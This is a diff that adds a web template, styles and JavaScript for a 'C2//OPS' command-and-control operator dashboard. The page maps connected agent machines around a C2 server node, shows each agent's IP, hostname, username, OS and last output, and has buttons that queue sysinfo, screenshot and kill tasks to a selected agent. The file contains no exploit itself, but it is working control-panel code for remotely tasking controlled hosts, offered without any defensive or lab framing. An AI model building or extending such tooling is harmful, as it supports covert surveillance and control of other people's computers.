@@ -1,0 +1,562 @@
+{% extends 'base.html' %}
+{% set active_page = 'map' %}
+{% block title %}Network Map — C2//OPS{% endblock %}
+
+{% block extra_style %}
+  /* Lock the page — no scroll on this view */
+  body { overflow: hidden; }
+  .page { height: calc(100vh - 54px); overflow: hidden; }
+
+  .map-wrap {
+    display: grid;
+    grid-template-columns: 1fr 320px;
+    height: 100%;
+  }
+
+  /* Canvas area */
+  .canvas-area {
+    position: relative;
+    overflow: hidden;
+    background: var(--bg);
+  }
+  #map-canvas {
+    position: absolute;
+    top: 0; left: 0;
+    display: block;
+  }
+
+  /* Legend */
+  .map-legend {
+    position: absolute;
+    bottom: 16px; left: 16px;
+    background: rgba(22,27,34,.92);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 10px 14px;
+    font-family: var(--font-mono);
+    font-size: .68rem;
+    color: var(--muted);
+    pointer-events: none;
+    backdrop-filter: blur(4px);
+  }
+  .legend-row { display: flex; align-items: center; gap: 8px; margin-bottom: 5px; }
+  .legend-row:last-child { margin-bottom: 0; }
+  .ldot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }
+  .ldiamond { width: 10px; height: 10px; background: var(--cyan); transform: rotate(45deg); flex-shrink: 0; }
+
+  /* Refresh badge */
+  .refresh-badge {
+    position: absolute;
+    top: 12px; right: 12px;
+    font-family: var(--font-mono);
+    font-size: .63rem;
+    color: var(--muted);
+    background: rgba(22,27,34,.92);
+    border: 1px solid var(--border);
+    padding: 3px 8px;
+    border-radius: 3px;
+    pointer-events: none;
+  }
+
+  /* Detail panel */
+  .detail-panel {
+    background: var(--surface);
+    border-left: 1px solid var(--border);
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    height: 100%;
+  }
+  .detail-hdr {
+    padding: 14px 16px;
+    border-bottom: 1px solid var(--border);
+    font-family: var(--font-mono);
+    font-size: .72rem;
+    color: var(--muted);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    flex-shrink: 0;
+  }
+  .detail-empty {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    color: var(--muted);
+    font-family: var(--font-mono);
+    font-size: .78rem;
+    gap: 12px;
+    text-align: center;
+    padding: 24px;
+  }
+  .detail-empty svg { opacity: .18; }
+  .detail-body {
+    flex: 1;
+    overflow-y: auto;
+    padding: 16px;
+    display: none;
+  }
+  .detail-body.visible { display: block; }
+
+  .agent-name {
+    font-family: var(--font-mono);
+    font-size: 1.05rem;
+    font-weight: 700;
+    color: var(--green);
+    margin-bottom: 6px;
+    word-break: break-all;
+  }
+  .agent-status-badge {
+    display: inline-block;
+    font-family: var(--font-mono);
+    font-size: .63rem;
+    font-weight: 700;
+    padding: 2px 8px;
+    border-radius: 3px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 14px;
+  }
+  .badge-active   { background: rgba(0,255,65,.12);  color: var(--green); border: 1px solid rgba(0,255,65,.3); }
+  .badge-inactive { background: rgba(255,68,68,.12); color: var(--red);   border: 1px solid rgba(255,68,68,.3); }
+
+  .stat-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 6px;
+    margin-bottom: 14px;
+  }
+  .stat-box {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    padding: 7px;
+    text-align: center;
+  }
+  .stat-val   { font-family: var(--font-mono); font-size: 1.15rem; font-weight: 700; color: var(--cyan); line-height: 1; }
+  .stat-label { font-size: .58rem; color: var(--muted); text-transform: uppercase; margin-top: 3px; }
+
+  .info-section { margin-bottom: 14px; }
+  .info-section-title {
+    font-family: var(--font-mono); font-size: .63rem;
+    color: var(--muted); text-transform: uppercase;
+    letter-spacing: 1px; margin-bottom: 7px;
+    padding-bottom: 4px; border-bottom: 1px solid var(--border);
+  }
+  .info-row {
+    display: grid;
+    grid-template-columns: 86px 1fr;
+    gap: 3px 6px;
+    margin-bottom: 3px;
+  }
+  .info-key { color: var(--muted); font-family: var(--font-mono); font-size: .7rem; }
+  .info-val { color: var(--text);  font-family: var(--font-mono); font-size: .7rem; word-break: break-all; }
+  .info-val.green { color: var(--green); }
+
+  .last-output-box {
+    background: var(--bg); border: 1px solid var(--border);
+    border-radius: 4px; padding: 9px;
+    font-family: var(--font-mono); font-size: .66rem;
+    color: var(--muted); max-height: 72px; overflow: hidden;
+    white-space: pre-wrap; word-break: break-all;
+    margin-bottom: 14px; line-height: 1.5;
+  }
+
+  .action-btn {
+    display: block; width: 100%; padding: 8px;
+    font-family: var(--font-mono); font-size: .76rem; font-weight: 700;
+    border-radius: 4px; cursor: pointer; text-align: center;
+    text-decoration: none; margin-bottom: 7px;
+    transition: all .15s; border: 1px solid;
+  }
+  .btn-primary  { background: var(--green); color: #000; border-color: var(--green); }
+  .btn-primary:hover { background: var(--green-dim); }
+  .btn-secondary { background: transparent; color: var(--cyan); border-color: rgba(0,212,255,.3); }
+  .btn-secondary:hover { background: rgba(0,212,255,.08); }
+  .btn-danger   { background: transparent; color: var(--red); border-color: rgba(255,68,68,.3); }
+  .btn-danger:hover { background: rgba(255,68,68,.08); }
+{% endblock %}
+
+{% block content %}
+<div class="map-wrap">
+
+  <div class="canvas-area">
+    <canvas id="map-canvas"></canvas>
+    <div class="map-legend">
+      <div class="legend-row"><div class="ldiamond"></div> C2 Server</div>
+      <div class="legend-row"><div class="ldot" style="background:#00ff41"></div> Active</div>
+      <div class="legend-row"><div class="ldot" style="background:#ff4444"></div> Inactive</div>
+      <div class="legend-row"><div class="ldot" style="background:#ffd700"></div> Pending tasks</div>
+    </div>
+    <div class="refresh-badge" id="refresh-badge">// loading...</div>
+  </div>
+
+  <div class="detail-panel">
+    <div class="detail-hdr">// Agent Detail</div>
+
+    <div class="detail-empty" id="detail-empty">
+      <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.2">
+        <circle cx="12" cy="12" r="3"/>
+        <circle cx="12" cy="12" r="8" stroke-dasharray="3 2"/>
+        <line x1="12" y1="4" x2="12" y2="2"/>
+        <line x1="12" y1="22" x2="12" y2="20"/>
+        <line x1="4"  y1="12" x2="2"  y2="12"/>
+        <line x1="22" y1="12" x2="20" y2="12"/>
+      </svg>
+      <div>Click an agent node<br>to view details</div>
+    </div>
+
+    <div class="detail-body" id="detail-body">
+      <div class="agent-name" id="d-hostname">—</div>
+      <span id="d-badge" class="agent-status-badge badge-active">ACTIVE</span>
+
+      <div class="stat-grid">
+        <div class="stat-box"><div class="stat-val" id="d-total">0</div><div class="stat-label">Tasks</div></div>
+        <div class="stat-box"><div class="stat-val" id="d-done" style="color:var(--green)">0</div><div class="stat-label">Done</div></div>
+        <div class="stat-box"><div class="stat-val" id="d-pending" style="color:var(--yellow)">0</div><div class="stat-label">Pending</div></div>
+      </div>
+
+      <div class="info-section">
+        <div class="info-section-title">// Network</div>
+        <div class="info-row"><span class="info-key">IP</span><span class="info-val green" id="d-ip">—</span></div>
+        <div class="info-row"><span class="info-key">Hostname</span><span class="info-val" id="d-host2">—</span></div>
+        <div class="info-row"><span class="info-key">Username</span><span class="info-val" id="d-user">—</span></div>
+      </div>
+
+      <div class="info-section">
+        <div class="info-section-title">// System</div>
+        <div class="info-row"><span class="info-key">OS</span><span class="info-val" id="d-os">—</span></div>
+        <div class="info-row"><span class="info-key">Version</span><span class="info-val" id="d-osver">—</span></div>
+        <div class="info-row"><span class="info-key">Agent ID</span><span class="info-val" id="d-agentid">—</span></div>
+      </div>
+
+      <div class="info-section">
+        <div class="info-section-title">// Timeline</div>
+        <div class="info-row"><span class="info-key">First seen</span><span class="info-val" id="d-first">—</span></div>
+        <div class="info-row"><span class="info-key">Last seen</span><span class="info-val" id="d-last">—</span></div>
+        <div class="info-row"><span class="info-key">Last result</span><span class="info-val" id="d-lastres">—</span></div>
+      </div>
+
+      <div class="info-section">
+        <div class="info-section-title">// Last Output</div>
+        <div class="last-output-box" id="d-output">(no results yet)</div>
+      </div>
+
+      <a  class="action-btn btn-primary"   id="d-terminal-btn" href="/dashboard">Open in Terminal</a>
+      <button class="action-btn btn-secondary" onclick="quickCmd('sysinfo')">Quick: sysinfo</button>
+      <button class="action-btn btn-secondary" onclick="quickCmd('screenshot')">Quick: screenshot</button>
+      <button class="action-btn btn-danger"    onclick="quickCmd('kill')">Send: kill</button>
+    </div>
+  </div>
+
+</div>
+{% endblock %}
+
+{% block extra_script %}
+// ── State ─────────────────────────────────────────────────────────────────────
+let agents        = [];
+let nodePositions = {};   // agentId -> {x, y, r}
+let selectedId    = null;
+let hoveredId     = null;
+
+const canvas = document.getElementById('map-canvas');
+const ctx    = canvas.getContext('2d');
+
+// ── Layout ────────────────────────────────────────────────────────────────────
+function sizeCanvas() {
+  const area = canvas.parentElement;
+  canvas.width  = area.clientWidth;
+  canvas.height = area.clientHeight;
+}
+
+function calcLayout() {
+  const cx = canvas.width  / 2;
+  const cy = canvas.height / 2;
+  nodePositions = {};
+  if (!agents.length) return;
+
+  // Distribute into concentric rings: 6, 10, 14, ...
+  const ringSizes = [6, 10, 14, 18];
+  const ringRadii = [160, 290, 400, 500];
+  let placed = 0;
+  let ring   = 0;
+  while (placed < agents.length) {
+    const cap    = ringSizes[Math.min(ring, ringSizes.length - 1)];
+    const radius = ringRadii[Math.min(ring, ringRadii.length - 1)];
+    const slice  = agents.slice(placed, placed + cap);
+    slice.forEach((a, i) => {
+      const angle = (2 * Math.PI / slice.length) * i - Math.PI / 2;
+      nodePositions[a.id] = {
+        x: cx + radius * Math.cos(angle),
+        y: cy + radius * Math.sin(angle),
+        r: 14,
+      };
+    });
+    placed += cap;
+    ring++;
+  }
+}
+
+// ── Drawing ───────────────────────────────────────────────────────────────────
+function draw(ts) {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+  // Subtle grid
+  ctx.strokeStyle = 'rgba(0,255,65,0.03)';
+  ctx.lineWidth   = 1;
+  for (let x = 0; x < canvas.width;  x += 40) { ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke(); }
+  for (let y = 0; y < canvas.height; y += 40) { ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke(); }
+
+  const cx = canvas.width  / 2;
+  const cy = canvas.height / 2;
+  const t  = ts / 1000;
+
+  // Edges
+  agents.forEach(a => {
+    const pos = nodePositions[a.id];
+    if (!pos) return;
+    ctx.beginPath();
+    ctx.moveTo(cx, cy);
+    ctx.lineTo(pos.x, pos.y);
+    ctx.strokeStyle = a.id === selectedId
+      ? 'rgba(0,212,255,0.4)'
+      : 'rgba(33,38,45,0.9)';
+    ctx.lineWidth = a.id === selectedId ? 1.5 : 1;
+    ctx.setLineDash(a.status === 'inactive' ? [4, 4] : []);
+    ctx.stroke();
+    ctx.setLineDash([]);
+  });
+
+  // Agent nodes
+  agents.forEach(a => {
+    const pos = nodePositions[a.id];
+    if (!pos) return;
+    const active  = a.status === 'active';
+    const hasPend = a.pending_tasks > 0;
+    const color   = hasPend ? '#ffd700' : (active ? '#00ff41' : '#ff4444');
+    const isHov   = a.id === hoveredId;
+    const isSel   = a.id === selectedId;
+    const r       = pos.r + (isHov || isSel ? 3 : 0);
+
+    // Pulse ring on active nodes
+    if (active) {
+      const pulse = 0.4 + 0.3 * Math.sin(t * 2.5 + pos.x);
+      ctx.beginPath();
+      ctx.arc(pos.x, pos.y, r + 8 + 4 * Math.sin(t * 2 + pos.y), 0, Math.PI * 2);
+      ctx.strokeStyle = color.replace(')', `, ${pulse * 0.3})`).replace('rgb', 'rgba').replace('#', 'rgba(').replace('rgba(', 'rgba(');
+      // Simple approach
+      ctx.strokeStyle = `rgba(${hexToRgb(color)},${pulse * 0.25})`;
+      ctx.lineWidth   = 2;
+      ctx.stroke();
+    }
+
+    // Node fill
+    const grad = ctx.createRadialGradient(pos.x - r*0.3, pos.y - r*0.3, 1, pos.x, pos.y, r);
+    grad.addColorStop(0, lighten(color));
+    grad.addColorStop(1, color);
+    ctx.beginPath();
+    ctx.arc(pos.x, pos.y, r, 0, Math.PI * 2);
+    ctx.fillStyle = grad;
+    ctx.fill();
+
+    // Border
+    ctx.strokeStyle = isSel ? '#fff' : darken(color);
+    ctx.lineWidth   = isSel ? 2.5 : 1.5;
+    ctx.stroke();
+
+    // OS icon inside node
+    ctx.font         = `${r - 3}px serif`;
+    ctx.textAlign    = 'center';
+    ctx.textBaseline = 'middle';
+    ctx.fillText(osEmoji(a.os), pos.x, pos.y);
+
+    // Pending badge
+    if (hasPend) {
+      ctx.beginPath();
+      ctx.arc(pos.x + r - 2, pos.y - r + 2, 6, 0, Math.PI * 2);
+      ctx.fillStyle = '#ffd700';
+      ctx.fill();
+      ctx.fillStyle = '#000';
+      ctx.font = 'bold 7px JetBrains Mono, monospace';
+      ctx.textAlign = 'center';
+      ctx.textBaseline = 'middle';
+      ctx.fillText(String(Math.min(a.pending_tasks, 9)), pos.x + r - 2, pos.y - r + 2);
+    }
+
+    // Label
+    ctx.font         = '11px JetBrains Mono, monospace';
+    ctx.textAlign    = 'center';
+    ctx.textBaseline = 'top';
+    ctx.fillStyle    = isSel ? '#ffffff' : '#8b949e';
+    ctx.fillText(a.hostname.slice(0, 18), pos.x, pos.y + r + 5);
+
+    // IP below hostname
+    ctx.font      = '9px JetBrains Mono, monospace';
+    ctx.fillStyle = isSel ? color : 'rgba(139,148,158,0.55)';
+    ctx.fillText(a.ip, pos.x, pos.y + r + 19);
+  });
+
+  // C2 server node (diamond)
+  const s = 24;
+  ctx.save();
+  ctx.translate(cx, cy);
+  ctx.rotate(Math.PI / 4);
+
+  // Glow
+  const glow = ctx.createRadialGradient(0, 0, 0, 0, 0, s * 2);
+  glow.addColorStop(0, 'rgba(0,212,255,0.15)');
+  glow.addColorStop(1, 'rgba(0,212,255,0)');
+  ctx.beginPath();
+  ctx.rect(-s * 2, -s * 2, s * 4, s * 4);
+  ctx.fillStyle = glow;
+  ctx.fill();
+
+  ctx.beginPath();
+  ctx.rect(-s, -s, s * 2, s * 2);
+  const cgrad = ctx.createLinearGradient(-s, -s, s, s);
+  cgrad.addColorStop(0, '#33ddff');
+  cgrad.addColorStop(1, '#00d4ff');
+  ctx.fillStyle   = cgrad;
+  ctx.fill();
+  ctx.strokeStyle = '#007fa3';
+  ctx.lineWidth   = 2;
+  ctx.stroke();
+  ctx.restore();
+
+  ctx.font         = 'bold 11px JetBrains Mono, monospace';
+  ctx.textAlign    = 'center';
+  ctx.textBaseline = 'top';
+  ctx.fillStyle    = '#00d4ff';
+  ctx.fillText('C2 SERVER', cx, cy + s + 8);
+  ctx.font      = '9px JetBrains Mono, monospace';
+  ctx.fillStyle = 'rgba(0,212,255,0.5)';
+  ctx.fillText(`${agents.filter(a=>a.status==='active').length} active`, cx, cy + s + 22);
+
+  requestAnimationFrame(draw);
+}
+
+// ── OS helpers ────────────────────────────────────────────────────────────────
+function osEmoji(os) {
+  if (!os) return '?';
+  const s = os.toLowerCase();
+  if (s.includes('linux'))   return '🐧';
+  if (s.includes('windows')) return '🪟';
+  if (s.includes('darwin') || s.includes('mac')) return '🍎';
+  if (s.includes('android')) return '🤖';
+  return '💻';
+}
+
+// ── Colour helpers ────────────────────────────────────────────────────────────
+function hexToRgb(hex) {
+  const r = parseInt(hex.slice(1,3),16);
+  const g = parseInt(hex.slice(3,5),16);
+  const b = parseInt(hex.slice(5,7),16);
+  return `${r},${g},${b}`;
+}
+function lighten(hex) {
+  return hex === '#00ff41' ? '#66ff88'
+       : hex === '#ff4444' ? '#ff7777'
+       : hex === '#ffd700' ? '#ffe84d'
+       : '#ffffff';
+}
+function darken(hex) {
+  return hex === '#00ff41' ? '#00c832'
+       : hex === '#ff4444' ? '#cc2222'
+       : hex === '#ffd700' ? '#b39a00'
+       : '#555';
+}
+
+// ── Hit test ──────────────────────────────────────────────────────────────────
+function hitTest(mx, my) {
+  for (const a of agents) {
+    const pos = nodePositions[a.id];
+    if (!pos) continue;
+    const dx = mx - pos.x, dy = my - pos.y;
+    if (Math.sqrt(dx*dx + dy*dy) <= pos.r + 6) return a.id;
+  }
+  return null;
+}
+
+canvas.addEventListener('mousemove', e => {
+  const rect = canvas.getBoundingClientRect();
+  hoveredId = hitTest(e.clientX - rect.left, e.clientY - rect.top);
+  canvas.style.cursor = hoveredId ? 'pointer' : 'default';
+});
+
+canvas.addEventListener('click', e => {
+  const rect = canvas.getBoundingClientRect();
+  const id   = hitTest(e.clientX - rect.left, e.clientY - rect.top);
+  if (id) loadAgentDetail(id);
+});
+
+// ── Data ──────────────────────────────────────────────────────────────────────
+async function loadAgents() {
+  try {
+    agents = await (await fetch('/api/agents')).json();
+    calcLayout();
+    document.getElementById('refresh-badge').textContent =
+      `// ${agents.length} agent${agents.length !== 1 ? 's' : ''} · ${new Date().toLocaleTimeString()}`;
+    if (selectedId && agents.find(a => a.id === selectedId)) {
+      loadAgentDetail(selectedId);
+    }
+  } catch(e) {
+    document.getElementById('refresh-badge').textContent = '// fetch error';
+  }
+}
+
+async function loadAgentDetail(agentId) {
+  selectedId = agentId;
+  try {
+    const a = await (await fetch('/api/agent/' + agentId)).json();
+    document.getElementById('detail-empty').style.display = 'none';
+    document.getElementById('detail-body').classList.add('visible');
+
+    document.getElementById('d-hostname').textContent = a.hostname;
+    document.getElementById('d-host2').textContent    = a.hostname;
+    document.getElementById('d-ip').textContent       = a.ip;
+    document.getElementById('d-user').textContent     = a.username;
+    document.getElementById('d-os').textContent       = a.os;
+    document.getElementById('d-osver').textContent    = (a.os_version || '—').slice(0, 38);
+    document.getElementById('d-agentid').textContent  = a.id;
+    document.getElementById('d-total').textContent    = a.tasks_total;
+    document.getElementById('d-done').textContent     = a.tasks_completed;
+    document.getElementById('d-pending').textContent  = a.tasks_pending;
+    document.getElementById('d-first').textContent    = fmtTime(a.first_seen);
+    document.getElementById('d-last').textContent     = fmtTime(a.last_seen);
+    document.getElementById('d-lastres').textContent  = a.last_result_at ? fmtTime(a.last_result_at) : 'never';
+
+    const out = a.last_output || '(no results yet)';
+    document.getElementById('d-output').textContent =
+      out.startsWith('[SCREENSHOT_B64]') ? '[screenshot data]' : out;
+
+    const badge = document.getElementById('d-badge');
+    badge.textContent = a.status.toUpperCase();
+    badge.className = 'agent-status-badge ' + (a.status === 'active' ? 'badge-active' : 'badge-inactive');
+  } catch(e) { console.error(e); }
+}
+
+async function quickCmd(cmd) {
+  if (!selectedId) return;
+  if (cmd === 'kill' && !confirm('Send KILL to this agent?')) return;
+  await fetch('/api/task', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ agent_id: selectedId, command: cmd }),
+  });
+  const btn = event.target;
+  const orig = btn.textContent;
+  btn.textContent = '// queued';
+  setTimeout(() => btn.textContent = orig, 1500);
+}
+
+function fmtTime(iso) {
+  if (!iso) return '—';
+  return new Date(iso + 'Z').toLocaleString();
+}
+
+// ── Init ──────────────────────────────────────────────────────────────────────
+window.addEventListener('resize', () => { sizeCanvas(); calcLayout(); });
+sizeCanvas();
+loadAgents().then(() => requestAnimationFrame(draw));
+setInterval(loadAgents, 10000);
+{% endblock %}
